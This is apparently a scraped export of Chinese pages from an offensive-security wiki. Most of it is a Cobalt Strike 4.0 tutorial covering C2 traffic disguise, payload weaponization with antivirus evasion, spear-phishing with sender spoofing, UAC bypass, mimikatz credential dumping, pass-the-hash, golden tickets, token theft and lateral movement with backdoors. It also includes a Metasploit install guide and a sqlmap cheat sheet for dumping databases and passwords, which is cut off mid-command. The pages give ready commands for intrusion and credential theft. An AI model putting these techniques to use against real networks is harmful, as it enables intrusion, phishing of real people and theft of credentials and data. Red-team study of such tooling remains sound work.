首先打开文件，进行自定义编辑，编辑好后直接运行./c2lint xxx 以上是成功运行的全部过程截图。C2可以通过自定义POST/GET包的形式，未造成正常使用的数据包来逃逸防火墙的检测。 C2 运行效果展示 ./teamserver [ip] [password] etumbot.profile Deafault 效果展示 接下来再Listener里面配置上线信息，并生成powershell监听器。 并在windows客户端运行上线。 我们再Beacon里面，执行一下命令。 如上图所示，上面的PWD命令被我们未造成了一个普通的数据包。 Get-only 效果展示 配置新的Get-only监视器，并且通过Spawn进行上线。 我们在Beacon里面执行ps命令。 这里可以看到数据包所展示的是一个正常流量的数据包。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-20 19:12:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/4.Weaponization/4.Weaponization.html":{"url":"Tools/Cobalt Strike 4.0/4.Weaponization/4.Weaponization.html","title":" 4.Weaponization","keywords":"","body":"Weaponzation 介绍 首先探讨下“武器化”，按照我个人的理解用一把枪来做类比，一颗子弹或者一把空枪不足以构成威胁，同样的在Cobalt Strike将payload和可执行文件（EXE，DLL或者powershell等）结合起来构成了武器化的概念。 在Cobalt Strike中首先解释几个概念： artifact可以理解为包含了payload的全功能被控制程序。 stage本身是一段尽可能小的手工优化过的汇编程序，连接到主控制端，按照主控制端的要求对大的payload进行下载。 payload是指一段任意大小的，与位置无关的代码，被stage执行。Cobalt Strike中许多攻击和工作流都将payload用多个stage实现投递。 在上边两个图中表现了两种artifact的执行方式，一种是将payload用stage实现投递，另外一种方式是payload直接被运行在内存中。 可执行文件和DLLs 生成一个可执行文件或者DLL的方法Attacks->Packages->Windows EXE(s) 如何执行DLL文件首先生成一个和目标机器匹配的dll文件（x86或者x64），然后在目标机器上使用rundll32.exe 启动生成的dll并运行startw函数即可。 rundll32.exe artifact.dll,startw 托管文件 托管一个文件Attacks->Web Drive-by->Host File 管理或者删除托管文件Attacks->Web Drive-by->Manage 查看web活动View->Web Log 一些防御措施针对curl,wget和lynx返回404 以下为托管文件的具体操作 Artifact Kit Cobalt Strike使用Artifact Kit生成可执行文件和DLL，是一款商业框架，用于构建可绕过某些防病毒，具体下载方式 Help->Arsenal。 Artifact Kit工作原理 混淆shellcode并将其嵌套于二进制文件中，这种混淆可以绕过识别恶意代码的杀毒软件。 突破防病毒沙箱AV检测，Artifact Kit是可执行文件和DLL模板的集合，它依赖于反病毒产品不会模拟的某些行为来恢复二进制文件内的shellcode。 Artifact Kit使用步骤 Help->Arsenal 下载Artifact Kit，这个是需要授权的。下载完成后解压并执行文件夹中build.sh，该脚本在Linux上执行。 导入脚本，Cobalt Strike->Script Manager,从该文件夹中加载artifact.cna脚本，然后按照生成可执行文件的步骤操作即可。 Scripted Web Delivery 利用powershell、bitsadmin、python、regsvr32远程下马，提供的单行程序将允许攻击者快速获得目标主机的会话。 Attacks->Web Drive-by->Scripted Web Delivery Resource Kit Resource Kit是Cobalt Strike改变Cobalt Strike在其工作流程中使用的HTA，Powershell，Python，VBA和VBS脚本模板的方法。下载方法Help->Arsenal下载Resource Kit，这个同样需要授权，下载完成后将resources.cna脚本加载使用，然后按照生成可执行文件的步骤操作即可。 用户驱动攻击 在用户驱动攻击中包括了HTML、Java Signed Applet攻击、office宏、windows木马程序，这些攻击方式可以根据实际灵活变更，比如通过Resource Kit可以修改HTML以及office宏，通过Applet Kit修改Java Signed Applet攻击，通过Artifact Kit修改windows木马等。 msf运行32位Beacon 在Cobalt Strike中新建一个监听 在msf中选择一个客户端攻击木马 将payload设置为http或者https 将LHOST和RHOST设置为Beacon监听地址及端口 设置DisablePayloadHeadler为True 设置PrependMigrate为TRUE 生成一个木马，使用Cobalt Strike加载生成一个payload，目标及其访问后获得Beacon 自定义武器化 Attacks->Packages->Windows EXE(S) 生成一个现成的木马 Attacks->Packages->Payload Generator 生成一个payload 使用第三方artifact或者工具 自己写脚本集成到Cobalt Strike 行为检测与绕过 回到攻击链，我们现在讨论的目标是代码执行 如下图所示，四个环节都可能被检测到： 在攻击链的第一部分依旧是artifact这样一个包含了payload的全功能被控制程序，函数或者一些特征码会被检测到； 一旦我们的artifact在目标机器上运行，那我们就会看到一些行为，比如我们刚好有个office宏运行在一个临时的进程中，并且将我们的payload注入到进程中，这个时候会产生的行为可能就会被检测到，比如启动一个程序、注入一个新的或者已经存在的进程、写文件； 我们成功注入进程后，我们所有的操作会在内存中进行，根据payload占据内存和线程的属性也可能会被检测到； 进程行为也会被检测，比如explorer.exe,notepad.exe等进程做出了一些非常规的动作，或者还有些常见的被滥用应用程序检测。那么针对以上可能被检测到的点我们应该如何绕过 对于函数或者特征码以及注入进程的操作一般使用混淆来绕过 对于写文件、进程行为检测一般采用规避的方式 对于启动程序应该采用欺骗父进程的方式 此外对于payload检测同样应该采用规避的方式 内存检测及绕过 检测方式一般如下： 查找与内存映射文件没有关联的线程开始地址。 内存权限，读写权限是攻击工具中常见的模式，有时候内存区域的执行权限与内存映射文件无关，都会被严格检测。 内存内容也会被检测，比如一个PE文件或者与常见技术有关系的特征码等。 绕过方式: 修改artifact 启动地址 artifact避免使用读写执行权限 避免使用stagers 在Malleable C2的配置文件中设置userwx为false 开启stomping模块 设置image_size_x86以及image_size_x64 使用prepend实现PE在内存中的偏移量 设置obfuscate为true 设置cleanup为true 使用strrep来编辑字符串 设置sleep_mask为true Artifact行为一览表 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-20 11:16:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/5.Initial Access/5.Initial Access.html":{"url":"Tools/Cobalt Strike 4.0/5.Initial Access/5.Initial Access.html","title":" 5.Initial Access","keywords":"","body":"5 Initial Access(初始化访问) 这里主要说明怎样将一个武器化的文件投送到目标主机，并且让受害者打开它。 0x01 Client-side Attack（客户端主机侧攻击） 一开始我们需要拿到一台目标环境内的主机作为入口，然后才能进行权限提升、横向移动等操作。 Client-side Attack是指你利用一个可以命令执行的漏洞或者是桌面程序的特性，从而能够控制目标主机去访问攻击者控制的内容。 一般来说，处于内网主机的网络外层是部署了防火墙的，如果我们需要从外网访问内网，那么我们可以这样做： 先设计一个钓鱼情景，然后根据这个情景去设计一个武器化的文件，接着设计好邮件并把该文件作为附件放到邮件中，最后发送给目标邮件帐户。如果目标主机打开了这个文件，那么我们就可以获得一个攻击的入口点。 客户端主机侧的攻击步骤如下 收集目标的用户信息：基于开源情报进行主动和被动信息收集，尽可能多地去了解你的目标。 基于收集到的客户端主机信息，搭建一个与其环境一致的虚拟机 使用这个虚拟机寻找最好的攻击方式。当然，采取最好的攻击方式需要你收集到足够详细的信息，这样就可以提前知道你会遇到哪些问题，比如说可以利用的软件版本信息等。 尝试使用一个比较正常的场景来伪装我们的攻击方式，然后诱骗受害者打开我们进行过武器化的文档。 将这个文档打包好，通过邮件发送给你的目标。 Cobalt Strike工具介绍： 1. System Profiler System Profiler是一个用于客户端主机侧攻击的伪装工具，它是一个Web应用程序。Redirect URL是指任何一个用户访问System Profiler之后都会被设置跳转到这个URL。建议不要勾选Use java Applet to get information查看System profiler的结果：你可以在这看到操作系统的浏览器及版本信息，有可能会获取到目标机的内网IP。这里的IE是11.0.19203版本，可以根据这个来判断目标系统的补丁程序级别。 2. Website Clone Tool Cobal Strike可以根据给定的Clone URL进行网站克隆。如果你需要进行浏览器或者是浏览器插件的漏洞利用，那么你可以通过上图的Attack在网页内嵌入一个iframe标签来进行利用。Cobal Strike还支持键盘记录器。 0x02 Spear Phishing 进行的步骤如下： 创建一个目标列表，如下所示是指键盘上的tabjim.stevens@acme.comJim Stevens whatta.hogg@acme.comWhatta Hogg 创建一个模板 从你的邮箱中找一份邮件，然后点击列表中的查看消息源（或者是邮件导出、查看邮件原文等），如下图所示，然后将内容保存到本地。 Cobalt Strike有几个模板可以用来定制化邮件： |Token|描述| |:----:|:----:| |%URL%|嵌入的URL| |%To_Name%|目标的名称| |%To%|目标的邮箱地址| 对于每一封钓鱼邮件，这里的To都需要修改成目标列表中的邮箱地址，Cobal Strike会根据目标列表对To的内容进行替换。另外，这里的Date和附件内容之后也会被修改掉。注意，如果你只是将邮件发给某个人进行钓鱼，那么From这个header修不修改都可以，如果不是，那么建议你修改From这个header以避免对情报收集产生影响。Bounce To是将发件人修改为这个值。 Attacks -> Spear Phish 点击Preview可以查看到修改后的邮件正文 选择一个邮件服务器来发送邮件这里有两种选择：（1）在本地搭建一个SMTP服务器：Cobal Strike连接到服务器的25端口（SMTP服务端口），然后Cobal Strike会把消息发给本地SMTP服务器，接着SMTP服务器会去查询接收邮件的域名的DNS解析记录和MX记录（邮件交换记录），然后本地SMTP服务器就会连接到目标域名的邮件服务器进行后续的邮件发送操作了（2）通过云邮件服务提供商来使用我们用来钓鱼的域名：Cobal Strike的phishing tool可以提供认证选项来连接到云邮件服务提供商。Cobal Strike将邮件发给云邮件服务提供商后，它会去查询目标的MX记录，然后与目标域名的邮件服务器进行通信，将邮件发给目标地址。 汇总所有的东西，然后将邮件发送给目标主机的邮箱 0x03 Tradecraft(社工) 现在对用户使用钓鱼这个行为已经越来越难实现了，尤其是那些将邮件服务部署在云服务商的企业。首先，你得绕过垃圾邮件过滤器，还得遵循电子邮件认证协议等规则（SPF、DKIM、DMARC等）。由于邮件附件是一个武器化的文件，你还得绕过反病毒网关的检测，甚至有些软件还带有沙箱功能，会尝试打开这个文件并追踪其行为。 对邮件头的From进行伪造 邮件头的From头的值是用户收到邮件后在邮件客户端上看到的发件人 使用dig +short MX [domain]查看目标邮件服务器的MX记录 建议你确保Fromheader与Bounce To的内容一致，这样就可以让From和Mail From在信封里的内容一致，否则某些服务器在对邮件进行检查时，就会把邮件归类到垃圾邮件或者可疑邮件，甚至是恶意邮件。 了解目标域名是否使用了SPF。当你与目标邮件服务器建立连接，想要发送邮件时，目标的邮件服务器就会去txt记录里查询你的域名，然后再查看SPF记录，SPF记录就会列出允许一个列表，列表里包含了允许使用你的域名发送邮件的一些IP。如果检查发现from里的IP不在这个列表里，那么SPF校验就会认定失败，邮件伪造就会失败。如果目标邮件服务器使用了SPF，那么使用域名伪造（任意伪造发件人）是行不通的。dig +short TXT domain.com # 查询某个域名的SPF记录 另外一种反电子邮件欺骗的机制是DKIM（域名密钥识别邮件标准）。 参考百度百科：DKIM 的基本工作原理同样是基于传统的密钥认证方式，他会产生两组钥匙，公钥(public key)和私钥(private key)，公钥将会存放在 DNS 中，而私钥会存放在寄信服务器中。数字签名会自动产生，并依附在邮件头中，发送到寄信者的服务器里。公钥则放在DNS服务器上，供自动获得。收信的服务器，将会收到夹带在邮件头中的签名和在DNS上自己获取公钥，然后进行比对，比较寄信者的域名是否合法，如果不合法，则判定为垃圾邮件 DMARC是基于SPF和DKIM推出的一个电子邮件安全协议，它可以设置当SPF和DKIM校验失败后的操作，你可以执行以下命令来查看服务器的DMARC配置。dig +short TXT _dmarc.domain.com 注意事项 不要让你的邮件被识别为垃圾邮件：（1）尽量使用一个可信度比较高的域名作为邮件服务器（2）在targets list里最好写上目标的名字（3）确保From和Mail From的内容一致（4）避免使用可疑的URL，比如IP地址（5）为你的域名配置好SPF、DKIM和DMARC，这样可以增加你的域名的可信度 不要让你的邮件被过滤掉（1）不要在附件里放上可执行文件（比如exe和dll文件）（2）不要在附件里放上任何已经被杀毒软件识别的文件0x04 Assume Breach（假设钓鱼成功） 准备一个win7虚拟机，在虚拟机里模拟好真实环境后，再进行练习操作，最后再传输payload进行执行。接着就是内网主机端口扫描，使用make_token命令创建一个token来传递凭据，然后是内网横向移动技术 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 18:02:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/7.Privilege Escalation/7.Privilege Escalation.html":{"url":"Tools/Cobalt Strike 4.0/7.Privilege Escalation/7.Privilege Escalation.html","title":" 7.Privilege Escalation","keywords":"","body":"Privilege Escalation 这一章节中我们讨论各种通过Beacon提权的方式 。 Elevate 列出权限目录： elevate 生成提权会话：elevate [module] [listener] 界面操作如下：[session] -> Access ->Elevate RunAsAdmin 列出提权命令提示：runasadmin 在已提权会话中运行指令：runasadmin [module] [command] Elevate vs RunAsAdmin elevate能够产生一个提权的会话，一些提权工具可以很容易执行并达到提权目的。 runasadmin可以使用自己的武器库进行，比如使用高权限运行一个exe文件，给目标发送命令，或者只是想执行一条powershell。使用session->Access->One-liner 可以生成一条powershell来生成一个新的会话。 Elevate Kit Elevate Kit 是一个Aggressor脚本，将几个提权漏洞集成到Cobalt Strike中。下载地址：https://github.com/rsmudge/ElevateKit 具体使用方法如下： Cobalt Strike -> Scripts,点击Load, 将elevate.cna加载到Cobalt Strike 选择Interact ，在Beacon中输入elevate可以查看提权目录，新建一个监听器，使用ms15-051输入 elevate ms15-051 [listener name]，获取system权限成功。 SharpUp sharpup是一个用来扫描提权漏洞或者缺失安全配置项的工具，通过不同的利用方法进行提权。在Beacon中这样调用：execute-assembly /local/path/SharpUp.exe all 下载地址：https://github.com/GhostPack/SharpUp 在Beacon中执行execute-assembly /local/path/SharpUp.exe all 后，发现VMTools服务可修改。 生成一个EXE Payload，命名为vmtoolsd.exe 将vmtoolsd.exe上传到目标服务器上，并修改该服务对应文件路径，重启服务后显示成功，然后在Beacon中连接监听器端口，system权限主机上线成功。 Spawn As spawn as使用指定的凭证作为另一个用户生成一个会话。 打开方式：[session]->Access-Spawn As Kerberoasting 一些服务是以域账户作为服务登陆账户，这些账户往往权限比较高，甚至有的时候是域管理员身份。 kerberos认证中，服务账户与DC服务器中一个唯一的SPN（配置服务主体名称）关联。 kerberos票据中部分使用了用户密码哈希值生成。 攻击思路： 用SPNs在域控制器中查询账户 。 为关联服务向授权服务器申请一个票据 。 破解票据恢复密码。 攻击步骤： 在Beacon中 execute-assembly /path/to/rubeus.exe kerberosst 得到一个域账号及生成的票据。 下载生成的票据文件，使用hashcat工具破解得到密码。 使用sqawnas 生成另外一个会话。 提权问题集 没有权限，这种情况下需要查看是否有提权漏洞存在并利用。 当前用户 是administrator，但是没有相应权限 已经提权但是操作有限制。 UAC 用户账户控制（User Account Control）在Windows Vista及更高版本操作系统中采用的一种控制机制，其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，已达到帮助组织恶意程序损坏系统的效果。在操作系统中有三个权限，高权限（管理员权限），中权限（普通用户权限），低权限（限制权限）。在本地的管理员也会执行两种权限，一个是普通用户，另外一个是管理员权限。使用whoami /groups可以查看当前用户属于哪个权限组。那么如何绕过UAC，以下是几种方法： 使用elevate uac-teken-duplication [listener],这个提权漏洞在win10 RS5的版本中已经被修复 runasadmin uac-cmstplua [command] 其他elevate kit的方法 首先生成一个Powersehll one-liner ，然后使用runasadmin uac-cmstplua [one-liner] ，绕过uac成功。 Access Token 当用户登录后，系统创建一个令牌（Access Token），里边包含了用户和用户组信息、登录进程返回的SID和由本地安全策略分配给用户和用户的安全组的特权列表，系统使用令牌控制用户可以访问哪些安全对象，并控制用户执行相关系统操作的能力。令牌会一直存在，直到系统被重启。 令牌权限： whoami /priv查看当前令牌的权限。 在Beacon中使用getprivs可以获得尽可能多的权限。 首先查看当前权限，大部分为disable，使用getprivs后再查看当前权限，大部分已经是enable状态。 特权包括：SeCreateTokenPrivilege、SeDebugPrivilege、SeTcbPrivilege等 。 获取System权限 System权限是系统最高权限。 在Beacon中使用getsystem模拟System账户的令牌。 使用elevate svc-exe [listener] 在目标机器上启动一个服务来产生一个新会话，拥有System权限。 Credential and Hash [session]->Access-Dump Hashes，或者在Beacon中使用hashdump命令将目标机器中的哈希转存，logopasswords命令将使用mimikatz为登录到当前系统的用户读取明文密码和哈希。logopasswords命令与[session]->Access->Run Mimikatz相同。 使用dcsync [domain]从域控中提取所有账户密码哈希。所有的凭证在View->Credentials中查看。 Mimikatz mimikatz [command] [arguments] 执行一个mimikatz命令 mimikatz ![command] [arguments] 使用System权限执行mimikatz命令 mimikatz @[command] [arguments] 使用当前令牌执行mimikatz命令 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 23:35:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike 4.0/8.Lateral Movement/8.Lateral Movement.html":{"url":"Tools/Cobalt Strike 4.0/8.Lateral Movement/8.Lateral Movement.html","title":" 8.Lateral Movement","keywords":"","body":"8. Lateral Movement(横向移动) windows内网渗透步骤： 收集目标主机和用户信息： 哪些系统是我可以进行攻击的 这些系统的哪些用户有管理员权限 使用已有的可信凭据去获取管理员权限可信凭据： access tokens Password Hashes Credentials Kerberos Tickets 进行攻击 窃取文件 执行命令 执行某些payload 提取更多的可信凭据然后重复上述步骤0x01 Windows Enterprise（windows企业局域网） Active Directory是用来管理域内用户、系统及策略配置的一个服务，以下简称AD Domain（域）是一个管理员也是一个网络边界，在这里的用户和系统都是通过AD来管理的 Domain Controller（域控制器）用来管理AD内的用户和系统，它是域内权利最大的系统。 Local User（本地用户）：一个本地系统/主机上的标准用户，可以这样在Cobal Strike上这样来输入：.\\user或者COMPUTER_NAME\\user Domain User（域用户）：域用户是域控制器下的用户帐户，这些账户的详细名称是DOMAIN\\user Local Administrator：一个本地系统/主机上的有系统管理权限的用户 Domain Administrator（域管理员）：是一个在域控上拥有管理员权限的用户，是域上所有事情的本地管理员 0x02 Reconnaissance（侦查） 域环境通常会针对不同的权限级别设置不同的信任关系，找出哪些是受信任的域、你可以登录哪些域、存放数据的位置 使用Cobalt Strike收集域内信息 windows command# 查看当前网络内的域信息 net view /DOMAIN # 查找域控，结果输出域控机器上的用户名 # 32位beacon需要在console上输入完整的nltext.exe路径来执行 nltest /dclist:[DOMAIN] net group \"Domain Controllers\" /DOMAIN # 查看域内主机信息 net view /DOMAIN:[DOAMIN] # 依赖于computer browser服务，如果服务未开启，那么将没有结果输出 net group \"Domain Coputers\" /DOMAIN # NetBIOS名称在域上是每台机器的完整名称 # 将NetBIOS Name转换为IP地址 # NetBIOS Name举例 DESKTOP-ABCD123 nslookup [NetBIOS Name] ping -n 1 [NetBIOS Name] # 获取域上的信任关系 nltest /domain_trusts nltest /server:[address] /domain_trusts # 列出主机上的共享 net view \\\\[name] net module：通过调用windows API来执行命令# 在beacon console执行命令: # 查看域信息 beacon> net domain # 查找域控 beacon> net dclist [DOMAIN] beacon> net domain_controllers [DOMAIN] # 查看域内主机信息 beacon> net view [DOMAIN] # 与上文的windows命令直接结果一致 beacon> net computers [DOMAIN.FQDN] # 与上文的net group命令结果一致，但会额外输出主机的IP信息 在Beacon console执行完查看结果后，可以点击target图标显示你查找到的域控主机 PowerView# 导入powershell脚本 beacon> powershell-import /本地路径/PowerView.ps1 # 查看域信息 beacon> powerpick Get-NetDomain # 查找域控 beacon> powerpick Get-NetDomainController # 查看域内主机信息 beacon> powerpick Get-NetComputer SharpView .net实现的PowerView功能的脚本 获取管理员权限 当我们有了管理员权限之后，我们可以操作计划任务、与C盘进行交互、管理进程等等。域控的管理员可以作为任何一台域内主机的管理员进行操作。如果你想检查你当前的用户是否有管理员权限，可以在beacon上执行ls \\\\hosts\\C$查看是否允许访问C盘目录，也可以使用Powerview的powerpick Find-LocalAdminAccess来查看用户权限。 举例：域：corp.acme.compowershell执行结果：fileserver.corp.acme.comls \\\\fileserver\\C$：输出该服务器上的C盘目录 查找域控管理员# 使用run执行windows系统命令 net group \"enterprise admins\" /DOMAIN net group \"domain admins\" /DOMAIN net localgroup \"administrator\" /DOMAIN # 使用Beacon的net模块 net group \\\\DC Domain Admins net localgroup \\\\DC Administrators 本地管理员本地管理员用户一定是在本地的管理员组中的，这个用户也可能是一个域用户 ```shellbeacon net module net localgroup \\TARGET net localgroup \\TARGET group_name如net localgroup \\TARGET administrators powerview 针对一台主机进行查询 powershell Get-NetLocalGroup -HostName TARGET 针对多台主机进行查询 powershell Invoke-EnumerateLocalAdmin > 注意：Window10 RS1(2016)和Windows Server2016要求在查询本地组时需要使用管理员权限，若需要查看那么需要先打一个补丁 如果你有一个本地账户的密码或者密码哈希，如果这个用户是RID500（系统用户，比如Administrator、Guest等）且账户未被禁用，那么你可以在认证后执行远程操作。如果你拥有密码的用户是一个非RID500的用户，那么将不能进行认证以进行远程操作，除非你可以通过远程桌面登录。 ## 0x03 Agentless Post Exploitation 在获取到一台主机的权限后，不建议再传递payload去执行各种操作。可以采取如下办法： - 使用UNC路径来引用其他主机上的文件 ```shell # 从指定的目标主机上列举文件 shell dir \\\\host\\C$\\foo # 拷贝远程主机上的文件到本地 shell copy \\\\host\\C$\\foo\\secrets.txt # 将执行dir /S /B的结果保存至文件中 shell dir /S /B \\\\host\\c$ > files.txt 使用Beacon的File Browser上的地址栏查看文件 使用WinRM来执行命令 # 使用powershell powershell Invoke-Command -ComputerName TARGET -ScriptBlock {要执行的命令} # 通过WinRM使用PowerSploit来运行Mimikatz powershell-import /path/Invoke-Mimikatz.ps1 powershell Invoke-Mimikatz -ComouterName TARGET # Mimikatz有32位和64位的，建议不要使用32位的，另外Mimikatz需要将$PEBytes32重新修改为空 PowerSploit可参考https://github.com/PowerShellMafia/PowerSploit 使用dcsync来提取用户哈希，可以在Credentials面板上看到提取到的hash dcsync [domain] [DOMAIN\\user] dcsync [domain] 0x04 Trust Material access token windows的每个用户登录系统后，系统都会生成一个access token，用户登录后创建的每一个进程都含有该用户的access token的备份，当进程试图执行某些需要特殊权限的操作或者访问受保护的内核对象时，系统会检查其access token中的权限信息以决定是否授权操作。Administrator用户组成员的access token中会含有一些可以执行系统级操作的特权，但是这些特权默认是被禁用的，如果需要进行特权操作，那么进程则必须打开这些禁用的特权，即权限提升。参考 https://blog.csdn.net/zxh2075/article/details/8621821 # 查看进程列表 ps # 窃取token steal_token [pid] # 查看你拿到的token所关联的用户 getuid # 返回到控制目标主机的初始的token rev2self 示例：（1）beacon右键interact（2）右键 > Explore > Process List，可以看到哪些process的token是可获得的然后Beacon就会执行steal_token 3716，接着我们就有了这个jim.stevens的权限了执行getuid和rev2self： credentials（凭据）如果你有目标主机管理员用户的用户名和它的密码，你可以这样做 # 创建一个beacon spawnas DOMAIN\\user password # 通过make_token命令来创建token以传递凭据 make_token DOMAIN\\user password # 当你提供的用户名或者密码有误时，你对远程主机进行的任何操作都会报错 # make_token命令执行后会拷贝你当前使用的token，然后给出一个新的logon session password hashes(PTH) 使用Beacon传递hashpth DOMAIN\\user ntlmhash 首先我们需要基于你提供的hash创建一个带有access token的进程，Beacon会通过steal_token获取到这个临时进程的access token。 在进行这个过程中，会使用到cmd.exe回传token到Beacon，还会对内存进行读取操作，pth命令需要你在一个有权限的环境下使用。通过cmd.exe执行命令动作比较大，不建议使用pth命令。使用rundll32.exe创建64位进程可能会出问题，建议使用dllhost.exe。 spwanto x64 c:\\windows\\system32\\dllhost.exe 举例说明：（1）ntlm hash：（2）pth 使用Mimikatz传递hashmimikatz sekurlsa::pth /user:用户名 /domain:域名 /ntlm:哈希 /run:\"powershell -w hidden\" steal_token pid 当你通过Beacon获取到这个access token后，之后进行的操作仍然会通过这个进程来执行。 kerberos ticketsKerberos是一个通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务，具体此处不再详述。我们可以通过Kerberos tickets来进行认证登录到服务器 # Beacon console执行 # 查看本地存储的Kerberos tickets run klist # 清除票据 kerberos_ticket_purge # 加载票据 kerberos_ticket_use [/path/file.ticket] 伪造黄金票据（Golden Ticket，即上图的ST） 需要知道用户名和域名称：执行net domain 域SID：执行whoami /user，丢掉最后一段数即可，可参考下图 域控上的krbtgt用户的NTLM hash：用dcsync导出 这个票据实际上仅仅只能有效几个小时，使用klist查看票据可看到票据的end time，即为有效时间 beacon右键 > Access > Golden Ticket另外你在使用BIOS Name、Domain Name、IP address访问主机时，会影响你使用凭据进行认证的结果 0x05 Remote Code Execution 1. 横向移动自动化工具 targets列表 右键 > jump > 某一个module # 通过某个模块连接至某个主机 jump [module] [target] [listener] 模块 架构 描述 psexec x86 通过一个新的服务运行一个exe服务 psexec64 x64 通过一个新的服务运行一个exe服务 psexec_psh x86 通过一个新服务来运行powershell一句话，从而运行管道绑定stager winrm x86 通过WinRM执行powershell脚本 winrm64 x64 通过WinRM执行powershell脚本 使用wirm64等同于执行jump winrm64 FILESERVER local - smb 2. 执行自定义后门程序 与你的目标建立信任关系 生成一个适合的后门Attack > Packages　> Windows executable(s)建议使用stageless类型的后门后门可以是以下形式 windows exe 作为系统服务 windows exe程序 dll等使用tcp Beacon或者smb beacon类型的payload 上传后门到目标主机上可以使用File Browser，通过输入UNC共享目录来上传文件。也可以使用命令上传：cd \\\\host\\C$\\windows\\temp upload /path/file.exe 在目标主机上运行这个后门# 查看在Cobalt Strike中注册的远程执行模块的列表 remote-exec # 在一个远程主机上执行命令 # psexec、winrm（powershell）、wmi（powershell） remote-exec [method] [target] [command] 通过后门进行控制成功执行后可以通过link和connect连接到Beacon 0x06 注意事项 当你第一次连接到session时，你的认证信息可能会不起作用，需要使用make_token来复制你的access token填充至凭据中。 如果当你在进行make_token或者steal_token时，你不能够运行进程，或者你看不到输出结果时，可以使用inject迁移到另一个进程中进行执行，或者使用elevate svc-exe来作为系统运行payload。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-27 21:10:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Metasploit/Debian9 安装 Metasploit.html":{"url":"Tools/Metasploit/Debian9 安装 Metasploit.html","title":" Debian9 安装 Metasploit","keywords":"","body":"Debian9 安装 Metasploit 0x0 添加Kali源 源地址：/etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib 添加数字证书 $wget archive.kali.org/archive-key.asc //下载签名 $apt-key add archive-key.asc //安装签名 更新包列表 $apt-get update 0x1 安装postgresql 添加postgresql源 deb http://apt.postgresql.org/pub/repos/apt/ stretch-pgdg main 安装postgresql $wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | apt-key add - //添加数字证书 $apt-get update $apt-get install postgresql 0x2 安装metasploit-framework $apt-get install metasploit-framework #so easy 0x3 初始化metasploit-framework $msfdb init 0x4 完成安装，检查 msf启动 $msfconsole 检测数据库连接 msf>db_status 出现postgresql connected to xxx说明数据库连接正常 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-16 16:24:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Sqlmap/sqlmap参数说明.html":{"url":"Tools/Sqlmap/sqlmap参数说明.html","title":"Sqlmap参数说明","keywords":"","body":"Sqlmap常用语句 基础信息 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --current-user #获取当前用户名称 python sqlmap/sqlmap.py -u \"http://www.xxoo.com/news?id=1\" --current-db #获取当前数据库名称 python sqlmap/sqlmap.py -u \"http://www.xxoo.com/news?id=1\" --tables -D \"db_name\" #列表名 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --columns -T \"tablename\" users-D \"db_name\" -v 0 #列字段 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump -C \"column_name\" -T \"table_name\" -D \"db_name\" -v 0 #获取字段内容 信息内容 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --smart --level 3 --users # smart智能 level 执行测试等级 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbms \"Mysql\" --users # dbms 指定数据库类型 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --users #列数据库用户 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dbs#列数据库 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --passwords #数据库用户密码 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --passwords-U root -v 0 #列出指定用户数据库密码 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump -C \"password,user,id\" -T \"tablename\" -D \"db_name\" --start 1 --stop 20 #列出指定字段，列出20条 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump-all -v 0 #列出所有数据库所有表 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --privileges #查看权限 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --privileges -U root #查看指定用户权限 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --is-dba -v 1 #是否是数据库管理员 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --roles #枚举数据库用户角色 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --udf-inject #导入用户自定义函数（获取系统权限！） python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --dump-all --exclude-sysdbs -v 0 #列出当前库所有表 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --union-cols #union 查询表记录 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --cookie \"COOKIE_VALUE\" #cookie注入 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" -b #获取banner信息 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --data \"id=3\" #post注入 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" -v 1 -f #指纹判别数据库类型 python sqlmap/sqlmap.py -u \"http://url/news?id=1\" --proxy\"http://127.0.0.1:8118\" #代理注入 python sqlmap/sqlmap.py -u 